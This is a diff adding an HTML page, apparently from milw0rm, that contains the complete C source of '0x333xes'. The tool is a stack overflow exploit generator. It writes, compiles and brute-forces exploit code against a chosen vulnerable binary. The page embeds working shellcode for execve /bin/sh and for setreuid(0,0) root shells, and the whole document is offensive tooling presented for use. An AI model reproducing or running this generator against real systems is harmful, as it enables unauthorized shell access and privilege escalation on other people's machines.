@@ -1,0 +1,359 @@
+<html>
+<head>
+<title>Stack overflow exploits sources codes generator
+</title>
+<pre>
+/*  0x333xes =&gt; stack overflow exploit generator
+ *
+ *  simple stack overflow exploit generator, that
+ *  permits you to generate a -working- exploit
+ *  source code.
+ */
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;getopt.h&gt;
+
+#define VERSION       &quot;0.3&quot;
+
+#define EXPLOIT       &quot;exploit.c&quot;
+#define TEST          &quot;xes&quot;        /* file created with test shellcode */
+
+#define LIMIT         0xc0000000
+#define XES_std       0xbffff000   /* address we start from to search for RET */
+#define XES_env       0xbfffe0ff   /* that is not really true ... but i found
+                                    * some environment variables located there ...
+                                    */
+
+#define MAX_LENGHT    10240  /* max buffer-lenght to exploit */
+#define MAX_EVIL      1337   /* max ret-buffer lenght */
+#define MAX           3      /* max shellcodes supported */
+
+#define fatal(x...)   { fprintf (stderr, ##x); exit(-333); }
+
+typedef struct { 
+        char * sh_name;
+        char * sh_type;
+} sharkode;
+
+sharkode shark[] = {
+
+   {
+      &quot; \&quot;touch xes\&quot; shellcode [-test only-]&quot;,
+      &quot;unsigned char test[] =\n\t&quot;
+      &quot;\&quot;\\xeb\\x30\\x5e\\x89\\x76\\x16\\x31\\xc0\\x88\&quot;\n\t&quot;
+      &quot;\&quot;\\x46\\x08\\x88\\x46\\x0b\\x88\\x46\\x15\\x89\&quot;\n\t&quot;
+      &quot;\&quot;\\x46\\x22\\xb0\\x0b\\x8d\\x5e\\x09\\x89\\x5e\&quot;\n\t&quot;
+      &quot;\&quot;\\x1a\\x8d\\x5e\\x0c\\x89\\x5e\\x1e\\x89\\xf3\&quot;\n\t&quot;
+      &quot;\&quot;\\x8d\\x4e\\x16\\x8d\\x56\\x22\\xcd\\x80\\x31\&quot;\n\t&quot;
+      &quot;\&quot;\\xc0\\xb0\\x01\\xcd\\x80\\xe8\\xcb\\xff\\xff\&quot;\n\t&quot;
+      &quot;\&quot;\\xff\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\&quot;\n\t&quot;
+      &quot;\&quot;\\x20\\x2d\\x63\\x20\\x74\\x6f\\x75\\x63\\x68\&quot;\n\t&quot;
+      &quot;\&quot;\\x20\\x78\\x65\\x73\&quot;;&quot;
+   },
+
+   {
+      &quot; execve(/bin/sh); [linux]&quot;,
+      &quot;unsigned char sharkode[] =\n\t&quot;
+      &quot;\&quot;\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\&quot;\n\t&quot;
+      &quot;\&quot;\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x99\\x52\\x53\&quot;\n\t&quot;
+      &quot;\&quot;\\x89\\xe1\\xb0\\x0b\\xcd\\x80\&quot;;&quot;
+   },
+
+   {
+      &quot; setreuid(0,0)  shellcode&quot;,
+      &quot;unsigned char sharkode[] =\n\t&quot;
+      &quot;\&quot;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x46\\xcd\&quot;\n\t&quot;
+      &quot;\&quot;\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\&quot;\n\t&quot;
+      &quot;\&quot;\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x8d\\x54\&quot;\n\t&quot;
+      &quot;\&quot;\\x24\\x08\\x50\\x53\\x8d\\x0c\\x24\\xb0\\x0b\&quot;\n\t&quot;
+      &quot;\&quot;\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\&quot;;&quot;
+   },
+
+   { NULL, NULL },
+};
+
+int off = 0;
+
+// prototypes
+int main (int, char * []);
+void usage (char *);
+void shak_list (void);
+unsigned long xes (int); /* find correct ret address */
+
+void
+usage (char * prg)
+{
+   fprintf (stderr, &quot;\n [~] 0x333xes =&gt; stack overflow exploit generator v%s [~]\n&quot;, VERSION);
+   fprintf (stderr, &quot; [~]          coded by c0wboy ~ www.0x333.org          [~] \n\n&quot;);
+   fprintf (stderr, &quot; Usage : %s [-b binary] [-e env ] [-w switch]&quot;, prg);
+   fprintf (stderr, &quot; [-s type] [-x] [-l lenght] [-o lenght] [-a align] [-h]\n&quot;);
+   fprintf (stderr, &quot;\n \t-b\tbugged binary\n&quot;);
+   fprintf (stderr, &quot; \t-e\tset environment variable bugged\n&quot;);
+   fprintf (stderr, &quot; \t-w\tset switch bugged\n&quot;);
+   fprintf (stderr, &quot; \t-s\tshellcode type [0-%d]\n&quot;, MAX-1);
+   fprintf (stderr, &quot; \t-x\tshellcode list\n&quot;);
+   fprintf (stderr, &quot; \t-l\tbuffer lenght\n&quot;);
+   fprintf (stderr, &quot; \t-o\tevil buffer (nop+shellcode) lenght (default 1337)\n&quot;);
+   fprintf (stderr, &quot; \t-a\talign the buffer (try 1)\n&quot;);
+   fprintf (stderr, &quot; \t-h\tdisplay this help\n\n&quot;);
+
+   exit (-333);
+}
+
+void
+shak_list (void)
+{
+   int list;
+   fprintf (stdout, &quot;\n [~] Shellcode Types :\n&quot;);
+   fprintf (stdout, &quot; --------------------- \n&quot;);      
+   
+   for (list = 0; shark[list].sh_name != NULL; ++list)
+      fprintf (stdout, &quot; [%d] %s\n&quot;, list, shark[list].sh_name);
+   fprintf (stdout, &quot;\n&quot;);
+   
+   exit (-333);
+}
+
+unsigned long
+xes (int hard)
+{
+   char wuffer[33];
+   unsigned long xes;
+   FILE * cya, * fd;
+   
+   if (off)
+      xes=XES_env;
+   else
+      xes=XES_std;
+
+   for (; xes &lt; (LIMIT+333) ; xes+=300)
+   {
+      bzero (wuffer, 33);
+      sprintf (wuffer, &quot;./exploit 0x%x&quot;, xes);
+
+      fprintf (stdout, &quot; * testing 0x%x\n&quot;, xes);
+      if ((cya=popen (wuffer, &quot;r&quot;)) == NULL)
+         fatal (&quot; [-] Error in testing exploit ...\n\n&quot;);
+      
+      if ((fd=fopen (TEST, &quot;r&quot;)))
+      {
+         pclose (cya);
+         fclose (fd);
+         return xes;
+      }
+      pclose(cya);
+   }
+
+   if (!hard)
+      fprintf (stderr, &quot;\n [-] ret address NOT found ..\n [-] we suppose :\n&quot;
+                       &quot; [*] wrong buffer align\n [~] try to solve this problem ...\n\n&quot;);
+
+   return (0x333);
+}
+
+
+int
+main (int argc, char * argv[])
+{
+   int c, s=1, len=0, out=MAX_EVIL, step=0, align=0, hard=0;
+   char exe[100], *bin=NULL, *w=NULL, *env=NULL;
+   unsigned long ret_add;
+   FILE * fd;
+
+   while(( c = getopt (argc, argv, &quot;xhb:e:w:s:l:o:a:&quot;)) != EOF)
+   {
+      switch(c)
+      {
+         case 'b' : bin = optarg; break;
+
+         case 'e' :
+            env = optarg;
+            off=1;
+            break;
+
+         case 'w' : w = optarg; break;
+
+         case 's' : /* shellcode types */
+            s = atoi (optarg);
+            if ((s&lt;0) || (s&gt;MAX-1))
+               usage (argv[0]);
+            break;
+
+         case 'x' : shak_list();
+
+         case 'l' :
+            len = atoi (optarg);
+            if (len&gt;MAX_LENGHT)
+               fatal (&quot; [-] explotable-buffer is too long\n&quot;);
+            break;
+
+         case 'o' :
+            out = atoi (optarg); 
+            if (out&gt;MAX_EVIL)
+               fatal (&quot; [-] ret-buffer too long\n&quot;);
+            break;
+
+         case 'a' : align = atoi (optarg); break;
+         case 'h' : usage(argv[0]);
+         default  : usage(argv[0]);
+      }
+   }
+
+   if ((!bin) || (!len) || ((env) &amp;&amp; (w)))
+      usage(argv[0]);
+
+   fprintf (stdout, &quot;\n [~] 0x333xes =&gt; stack overflow exploit generator [~]\n&quot;);
+   fprintf (stdout, &quot; [~]        coded by c0wboy ~ www.0x333.org       [~] \n\n&quot;);
+   fprintf (stdout, &quot; [*] creating source code ...\n&quot;);
+
+
+ do_sploit :   /* when ret is found, we re-write the exploit */
+
+   system (&quot;rm -rf xes&quot;);
+   
+   if((fd = fopen (EXPLOIT, &quot;w&quot;)) == NULL)
+      fatal (&quot; [-] Error in creating %s\n&quot;, EXPLOIT);
+
+   fprintf (fd, &quot;/*  Generated with 0x333xes ~ coded by c0wboy\n *&quot;);
+   fprintf (fd, &quot;\n *  ~ www.0x333.org ~\n *\n */ &quot;);
+
+   /* setting header */
+   fprintf (fd, &quot;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n&quot;);
+   fprintf (fd, &quot;#include &lt;string.h&gt;\n\n#define BIN\t\&quot;%s\&quot;\n#define NOP\t0x90\n&quot;, bin);
+   fprintf (fd, &quot;#define BUFFER\t%i\n&quot;, len);
+
+   if (!env)
+      fprintf (fd, &quot;#define OUTSIDE\t%i\n&quot;, out);
+
+   if (hard)
+      align = 1;
+
+   if (!align)
+      fprintf (fd, &quot;#define ALIGN\t0\n&quot;);
+   else
+      fprintf (fd, &quot;#define ALIGN\t%d\n&quot;, align);
+
+   if (step)
+      fprintf (fd, &quot;#define RET\t0x%x\n&quot;, ret_add);
+
+   /* setting shellcode */
+   if (step)
+      fprintf (fd, &quot;\n\n%s\n&quot;, shark[s].sh_type);
+   else
+      fprintf (fd, &quot;\n\n%s\n&quot;, shark[0].sh_type); /* test-shellcode */
+
+   /* setting main() */
+   if (step)
+      fprintf (fd, &quot;int\nmain ()\n&quot;);
+   else
+      fprintf (fd, &quot;int\nmain (int argc, char * argv[])\n&quot;);
+
+   if (env)
+      fprintf (fd, &quot;{\n   int x;\n   char buf[BUFFER], *bufz;\n&quot;);
+   else
+      fprintf (fd, &quot;{\n   int x;\n   char buf[BUFFER], out[OUTSIDE], *bufz;\n&quot;);
+
+   if (step)
+      fprintf (fd, &quot;   unsigned long ret_add = RET, *add_ptr ;\n\n&quot;);
+   else
+      fprintf (fd, &quot;   unsigned long ret_add, *add_ptr ;\n\n&quot;
+                   &quot;   if (argc != 2)\n      exit (-333);\n\n&quot;
+                   &quot;   ret_add = strtoul (argv[1], &amp;argv[1], 16);\n\n&quot;);
+
+   fprintf (fd, &quot;   bufz = buf + ALIGN;\n   add_ptr = (long *)bufz;\n\n&quot;
+                &quot;   for (x=0; x&lt;BUFFER-1; x+=4)\n&quot;
+                &quot;      *(add_ptr++)=ret_add;\n\n&quot;);
+
+   if (env)
+   {
+      if (step)
+      {
+         fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)buf, NOP, 333 + &quot;
+                      &quot;strlen (sharkode));\n   memcpy ((char *)buf+333, sharkode, &quot;
+                      &quot;strlen (sharkode));\n&quot;);
+      }
+      else
+      {
+         fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)buf, NOP, 333 + &quot;
+                      &quot;strlen (test));\n   memcpy ((char *)buf+333, test, strlen &quot;
+                      &quot;(test));\n\n&quot;);
+      }
+   }
+   else /* standard exploiting */
+   {
+      fprintf (fd, &quot;   /* nop + shellcode */\n   memset ((char *)out, NOP, OUTSIDE);\n&quot;);
+
+      if (step)
+         fprintf (fd, &quot;   memcpy ((char *)out + 333, sharkode, strlen(sharkode));\n\n&quot;);
+      else 
+         fprintf (fd, &quot;   memcpy ((char *)out + 333, test, strlen(test));\n\n&quot;);
+
+      fprintf (fd, &quot;   memcpy((char *)out, \&quot;OUT=\&quot;, 4);\n   putenv(out);\n\n&quot;);
+   }
+
+   /* environment bugged ? */
+   if (env)
+   {
+      if(step)
+         fprintf (fd, &quot;\n&quot;);
+      
+      fprintf (fd, &quot;   setenv (\&quot;%s\&quot;, buf, 333);\n&quot;, env);
+   }
+   
+   /* switch ? */
+   if (w)
+      fprintf (fd, &quot;   execl (BIN, BIN, \&quot;%s\&quot;, buf, NULL);\n&quot;, w);
+   else
+   {
+      if (env)
+         fprintf (fd, &quot;   execl (BIN, BIN, NULL);\n&quot;);
+      else
+         fprintf (fd, &quot;   execl (BIN, BIN, buf, NULL);\n&quot;);
+   }
+
+   fprintf (fd, &quot;\n   return 0;\n}\n\n&quot;);
+   fclose (fd);
+
+   /* compile &amp; test exploit */
+   if (!step)
+   {
+      sprintf (exe, &quot;gcc %s -o exploit&quot;, EXPLOIT);
+      system (exe);
+  
+      fprintf (stdout, &quot; [*] exploit created\n&quot;);
+      fprintf (stdout, &quot; [*] now find correct ret add\n\n&quot;);
+
+      if (( ret_add = xes (hard) ) == 0x333)
+      {
+         if (hard)
+         {
+            fprintf (stdout, &quot;\n [-] exploit doesn't work ...\n&quot;
+                             &quot; [*] maybe binary has not -stack- overflow problem [**]\n&quot;
+                             &quot; [-] other problems can be detected by reading source code ...\n&quot;
+                             &quot; [-] sorry\n\n&quot;);
+           exit (-333);
+         }
+         else
+            hard=1;
+
+         goto do_sploit;
+      }
+      else
+      {
+         step=1;
+         goto do_sploit;
+      }
+   }
+
+   system (&quot;rm -rf exploit xes&quot;);
+   fprintf (stdout, &quot;\n [*] your working exploit for %s is ready !\n\n&quot;, bin);
+   return 0;
+}
+</pre>
+//milw0rm.com
+</html>
+
